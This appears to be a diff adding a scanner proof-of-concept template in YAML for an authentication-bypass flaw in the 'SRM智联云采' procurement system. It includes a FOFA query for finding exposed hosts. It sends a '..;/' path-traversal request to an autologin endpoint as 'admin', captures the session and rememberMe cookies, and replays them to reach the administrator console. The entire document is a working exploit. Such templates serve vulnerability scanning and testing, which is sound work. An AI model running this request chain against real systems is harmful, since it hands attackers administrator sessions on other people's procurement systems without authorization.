@@ -1,0 +1,32 @@
+id: poc-yaml-srm-autologin-identity-authentication-bypass
+info:
+  name: SRM智联云采系统 autologin 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: srm
+  fofa: title=="SRM 2.0"
+requests:
+- method: GET
+  path: /adpweb/static/..;/api/sys/app/autologin?loginName=admin
+  expression: status_code == 302 && body == ""
+  output:
+  - regex_match(headers,"zhilink.session.id=(?P<cookie_1>.*?);")
+  - regex_match(headers,"rememberMe=(?P<cookie_2>.*?);")
+- method: GET
+  path: /adpweb/a
+  headers:
+    Cookie: zhilink.session.id={{.cookie_1}}; rememberMe={{.cookie_2}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"管理工作台") &&
+
+    contains(body,"SRM") &&
+
+    contains(body,"你好, 系统管理员") &&
+
+    contains(body,"退出登录")
+
+    '
+variables: {}
+transport: http
